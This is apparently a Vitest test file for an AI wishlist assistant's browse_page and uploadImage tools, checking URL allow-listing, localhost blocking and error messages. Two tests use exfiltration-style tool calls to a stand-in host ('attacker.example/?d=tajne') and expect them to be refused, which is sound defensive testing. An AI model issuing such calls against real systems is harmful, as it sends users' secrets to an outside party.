import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { error } from '@sveltejs/kit';
import * as m from '$lib/paraglide/messages.js';
import { SERVER_ERROR } from '$lib/modules/errors/server_error_codes.js';
import { AgentApiFailure } from '$lib/server/agent_access/api.js';
import { AGENT_SCOPE } from '$lib/modules/access_tokens/scopes.js';
import { AGENT_CREDENTIAL_KIND, type AgentCaller } from '$lib/server/agent_access/agent_caller.js';
import { callAgentMcpTool } from '$lib/server/agent_access/mcp_tools.js';
import type * as McpToolsModule from '$lib/server/agent_access/mcp_tools.js';
import { OPERATION_CHANNEL } from '$lib/server/operations/actor.js';
import { CHAT_BLOCK } from './chat_model.js';
import { chatToolQuery, chatTools, runChatToolCalls } from './chat_tools.js';

vi.mock('$lib/server/agent_access/mcp_tools.js', async (importOriginal) => ({
	...(await importOriginal<typeof McpToolsModule>()),
	callAgentMcpTool: vi.fn(),
}));

const BROWSE_PAGE_CONFIG = { accountId: 'account-123', apiToken: 'secret-browser-token' };

const CALLER: AgentCaller = {
	credential: { kind: AGENT_CREDENTIAL_KIND.chatSession, id: 'chat-1' },
	fastForward: false,
	grant: {
		userId: 'user-1',
		userName: 'Martin',
		tokenName: 'AI asistent',
		channel: OPERATION_CHANNEL.chatbot,
		scopes: Object.values(AGENT_SCOPE),
		wishlistIds: ['wishlist-1'],
	},
};

const ENVIRONMENT = { imageBucket: undefined, signal: undefined, conversationUrls: null };

function browseCall(url: string) {
	return { id: 'call-1', name: 'browse_page', input: { url } };
}

function errorCodeOf(round: Awaited<ReturnType<typeof runChatToolCalls>>): unknown {
	const [result] = round.results;
	if (result?.type !== CHAT_BLOCK.toolResult || !result.isError) {
		throw new Error(`No tool error among ${JSON.stringify(round.results)}`);
	}
	return (JSON.parse(result.content) as { error: { code: unknown } }).error.code;
}

function uploadImageCall(input: unknown) {
	return { id: 'call-1', name: 'uploadImage', input };
}

const STORED_IMAGE = { image: { reference: 'image-1' } };
const IMAGE_URL = 'https://cdn.shop.example.cz/kolo.jpg';
const RESTRICTED = { ...ENVIRONMENT, conversationUrls: new Set([IMAGE_URL]) };

const fetchStub = vi.fn<typeof fetch>();

beforeEach(() => {
	fetchStub.mockReset();
	vi.mocked(callAgentMcpTool).mockReset().mockResolvedValue({ body: STORED_IMAGE, status: 201 });
	vi.stubGlobal('fetch', fetchStub);
});

afterEach(() => {
	vi.unstubAllGlobals();
});

describe('chatTools', () => {
	it('offers browse_page only when the page browser is configured', () => {
		const withoutBrowser = chatTools(CALLER, null).map((tool) => tool.name);
		const withBrowser = chatTools(CALLER, BROWSE_PAGE_CONFIG).map((tool) => tool.name);

		expect(withoutBrowser).not.toContain('browse_page');
		expect(withBrowser).toContain('browse_page');
		expect(withBrowser.filter((name) => name !== 'browse_page')).toEqual(withoutBrowser);
	});

	it('describes browse_page with a required url and no secret', () => {
		const browseTool = chatTools(CALLER, BROWSE_PAGE_CONFIG).find(
			(tool) => tool.name === 'browse_page',
		);

		expect(browseTool?.inputSchema).toMatchObject({
			type: 'object',
			properties: { url: { type: 'string' } },
			required: ['url'],
		});
		expect(JSON.stringify(browseTool)).not.toContain(BROWSE_PAGE_CONFIG.apiToken);
	});
});

describe('runChatToolCalls', () => {
	it('opens the page and returns its markdown without forming a proposal', async () => {
		fetchStub.mockResolvedValue(
			new Response(JSON.stringify({ success: true, result: '# Kolo' }), { status: 200 }),
		);
		const tools = chatTools(CALLER, BROWSE_PAGE_CONFIG);

		const round = await runChatToolCalls(
			CALLER,
			tools,
			'wishlist-1',
			[{ id: 'call-1', name: 'browse_page', input: { url: 'https://shop.example.cz/kolo' } }],
			ENVIRONMENT,
		);

		expect(round.proposal).toBeNull();
		expect(round.results).toEqual([
			{
				type: CHAT_BLOCK.toolResult,
				toolCallId: 'call-1',
				content: JSON.stringify({
					url: 'https://shop.example.cz/kolo',
					markdown: '# Kolo',
					truncated: false,
				}),
				isError: false,
				durationMs: expect.any(Number),
			},
		]);
	});

	it('returns a failed page load as a tool error', async () => {
		const tools = chatTools(CALLER, BROWSE_PAGE_CONFIG);

		const round = await runChatToolCalls(
			CALLER,
			tools,
			'wishlist-1',
			[{ id: 'call-1', name: 'browse_page', input: { url: 'http://localhost/' } }],
			ENVIRONMENT,
		);

		expect(fetchStub).not.toHaveBeenCalled();
		expect(round.proposal).toBeNull();
		const [result] = round.results;
		expect(result?.type === CHAT_BLOCK.toolResult && result.isError).toBe(true);
		expect(result?.type === CHAT_BLOCK.toolResult && JSON.parse(result.content)).toMatchObject({
			error: { code: 'URL_NOT_ALLOWED' },
		});
	});

	it('treats browse_page as unknown when the page browser is not configured', async () => {
		const round = await runChatToolCalls(
			CALLER,
			chatTools(CALLER, null),
			'wishlist-1',
			[{ id: 'call-1', name: 'browse_page', input: { url: 'https://shop.example.cz/kolo' } }],
			ENVIRONMENT,
		);

		expect(fetchStub).not.toHaveBeenCalled();
		expect(errorCodeOf(round)).toBe('UNKNOWN_TOOL');
	});

	it('stops loading the page when the turn is stopped', async () => {
		fetchStub.mockImplementation(
			(_input, init) =>
				new Promise<Response>((_resolve, reject) => {
					init?.signal?.addEventListener('abort', () => reject(init.signal?.reason));
				}),
		);
		const turn = new AbortController();

		const round = runChatToolCalls(
			CALLER,
			chatTools(CALLER, BROWSE_PAGE_CONFIG),
			'wishlist-1',
			[browseCall('https://shop.example.cz/kolo')],
			{ ...ENVIRONMENT, signal: turn.signal },
		);
		turn.abort();

		expect(errorCodeOf(await round)).toBe('PAGE_NOT_LOADED');
	});

	it('opens a page whose address is in the chat', async () => {
		fetchStub.mockResolvedValue(
			new Response(JSON.stringify({ success: true, result: '# Kolo' }), { status: 200 }),
		);

		const round = await runChatToolCalls(
			CALLER,
			chatTools(CALLER, BROWSE_PAGE_CONFIG),
			'wishlist-1',
			[browseCall('https://shop.example.cz/kolo')],
			{ ...ENVIRONMENT, conversationUrls: new Set(['https://shop.example.cz/kolo']) },
		);

		expect(fetchStub).toHaveBeenCalledOnce();
		expect(round.results[0]).toMatchObject({ isError: false });
	});

	it('refuses a page whose address is not in the chat without loading it', async () => {
		const round = await runChatToolCalls(
			CALLER,
			chatTools(CALLER, BROWSE_PAGE_CONFIG),
			'wishlist-1',
			[browseCall('https://attacker.example/?d=tajne')],
			{ ...ENVIRONMENT, conversationUrls: new Set(['https://shop.example.cz/kolo']) },
		);

		expect(fetchStub).not.toHaveBeenCalled();
		expect(errorCodeOf(round)).toBe('URL_NOT_IN_CONVERSATION');
	});
});

describe('runChatToolCalls failures', () => {
	it.each([
		[
			'a wishlist outside the chat',
			() => error(403, SERVER_ERROR.AGENT_WISHLIST_NOT_ALLOWED),
			SERVER_ERROR.AGENT_WISHLIST_NOT_ALLOWED,
			m.server_error_agent_wishlist_not_allowed(),
		],
		[
			'a change of another wishlist',
			() => {
				throw new AgentApiFailure(400, SERVER_ERROR.AGENT_PROPOSAL_WISHLIST_MISMATCH);
			},
			SERVER_ERROR.AGENT_PROPOSAL_WISHLIST_MISMATCH,
			m.server_error_agent_proposal_wishlist_mismatch(),
		],
		[
			'a missing scope',
			() =>
				error(
					403,
					JSON.stringify({
						code: SERVER_ERROR.AGENT_SCOPE_MISSING,
						scope: AGENT_SCOPE.reservationsIdentities,
					}),
				),
			SERVER_ERROR.AGENT_SCOPE_MISSING,
			m.server_error_agent_scope_missing(),
		],
		[
			'an operation agents cannot use',
			() => error(404, SERVER_ERROR.AGENT_OPERATION_NOT_FOUND),
			SERVER_ERROR.AGENT_OPERATION_NOT_FOUND,
			m.server_error_agent_operation_not_found(),
		],
		[
			'a used-up change budget',
			() => {
				throw new AgentApiFailure(429, SERVER_ERROR.AGENT_DAILY_CHANGE_BUDGET_EXCEEDED);
			},
			SERVER_ERROR.AGENT_DAILY_CHANGE_BUDGET_EXCEEDED,
			m.server_error_agent_daily_change_budget_exceeded(),
		],
		[
			'a used-up image budget',
			() => {
				throw new AgentApiFailure(429, SERVER_ERROR.AGENT_DAILY_IMAGE_BUDGET_EXCEEDED);
			},
			SERVER_ERROR.AGENT_DAILY_IMAGE_BUDGET_EXCEEDED,
			m.server_error_agent_daily_image_budget_exceeded(),
		],
	])(
		'gives the UI’s own message for %s, for the model and the tool line alike',
		async (_label, fail, code, message) => {
			vi.mocked(callAgentMcpTool).mockImplementation(async () => fail());

			const round = await runChatToolCalls(
				CALLER,
				chatTools(CALLER, null),
				'wishlist-1',
				[{ id: 'call-1', name: 'readWishlistGifts', input: { wishlistShortId: 'other' } }],
				ENVIRONMENT,
			);

			const [result] = round.results;
			expect(result).toMatchObject({ isError: true });
			expect(result?.type === CHAT_BLOCK.toolResult && JSON.parse(result.content)).toEqual({
				error: { code, message },
			});
		},
	);
});

describe('runChatToolCalls uploadImage', () => {
	async function uploadImage(
		input: unknown,
		environment: typeof RESTRICTED | typeof ENVIRONMENT,
	) {
		return runChatToolCalls(
			CALLER,
			chatTools(CALLER, null),
			'wishlist-1',
			[uploadImageCall(input)],
			environment,
		);
	}

	it('refuses an image address that is not in the chat without downloading it', async () => {
		const round = await uploadImage(
			{ url: 'https://attacker.example/x.png?d=tajne', wishlistId: 'wishlist-1' },
			RESTRICTED,
		);

		expect(callAgentMcpTool).not.toHaveBeenCalled();
		expect(round.proposal).toBeNull();
		expect(errorCodeOf(round)).toBe('URL_NOT_IN_CONVERSATION');
	});

	it('refuses a missing or malformed image address when addresses are restricted', async () => {
		for (const input of [
			{ wishlistId: 'wishlist-1' },
			{ url: 42 },
			{ url: 'not an address' },
		]) {
			expect(errorCodeOf(await uploadImage(input, RESTRICTED))).toBe(
				'URL_NOT_IN_CONVERSATION',
			);
		}
		expect(callAgentMcpTool).not.toHaveBeenCalled();
	});

	it('stores an image whose address is in the chat', async () => {
		const input = { url: IMAGE_URL, wishlistId: 'wishlist-1' };

		const round = await uploadImage(input, RESTRICTED);

		expect(callAgentMcpTool).toHaveBeenCalledWith(CALLER, 'uploadImage', input, undefined);
		expect(round.results).toEqual([
			{
				type: CHAT_BLOCK.toolResult,
				toolCallId: 'call-1',
				content: JSON.stringify(STORED_IMAGE),
				isError: false,
				durationMs: expect.any(Number),
			},
		]);
	});

	it.each([
		['the chat has it without a trailing slash', IMAGE_URL, `${IMAGE_URL}/`],
		['the chat has it with a trailing slash', `${IMAGE_URL}/`, IMAGE_URL],
	])(
		'stores an image whose address differs only by a trailing slash when %s',
		async (_label, chatUrl, requestedUrl) => {
			const input = { url: requestedUrl, wishlistId: 'wishlist-1' };

			const round = await uploadImage(input, {
				...ENVIRONMENT,
				conversationUrls: new Set([chatUrl]),
			});

			expect(callAgentMcpTool).toHaveBeenCalledWith(CALLER, 'uploadImage', input, undefined);
			expect(round.results[0]).toMatchObject({ isError: false });
		},
	);

	it('stores an image from any address when addresses are not restricted', async () => {
		const input = { url: 'https://images.example.org/kolo.png', wishlistId: 'wishlist-1' };

		const round = await uploadImage(input, ENVIRONMENT);

		expect(callAgentMcpTool).toHaveBeenCalledWith(CALLER, 'uploadImage', input, undefined);
		expect(round.results[0]).toMatchObject({ isError: false });
	});
});

describe('chatToolQuery', () => {
	it('names the page a browse_page call opens', () => {
		expect(
			chatToolQuery({ name: 'browse_page', input: { url: 'https://shop.example.cz/kolo' } }),
		).toBe('https://shop.example.cz/kolo');
	});

	it('names nothing for other tools or refused addresses', () => {
		expect(
			chatToolQuery({ name: 'readWishlistGifts', input: { url: 'https://a.cz/' } }),
		).toBeNull();
		expect(
			chatToolQuery({ name: 'browse_page', input: { url: 'http://localhost/' } }),
		).toBeNull();
	});
});
